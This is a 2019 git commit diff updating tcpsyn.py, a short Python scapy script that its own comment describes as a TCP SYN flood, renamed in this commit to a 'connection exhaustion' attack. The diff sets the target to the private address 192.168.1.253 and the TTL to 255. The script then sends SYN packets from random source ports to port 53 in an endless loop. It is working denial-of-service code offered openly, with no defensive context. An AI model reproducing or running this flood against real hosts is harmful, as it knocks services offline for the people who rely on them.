07e8e852c6286a66c982b28283036f44e84e751b
hackingyseguridad <antonio_taboada@hotmail.es>
2019-10-09 09:11:49 +0200

    Update tcpsyn.py

--- tcpsyn.py
+++ tcpsyn.py
@@ -1,10 +1,10 @@
 #! /usr/bin/env python
 # Name : Antonio Taboada
 # Website : www.hackingyseguridad.com
-# Description : Simple ataque de inundacion TCP SYN
+# Description : Simple ataque de agotamiento de conexiones TCP SYN
 import sys
 from scapy.all import *
-ip=IP(dst="0.0.0.0",frag=0,ttl=64)
+ip=IP(dst="192.168.1.253",frag=0,ttl=255)
 SYN=TCP(sport=RandShort(),dport=53,flags="S",window=29200)
 while True:
     send(ip/SYN)
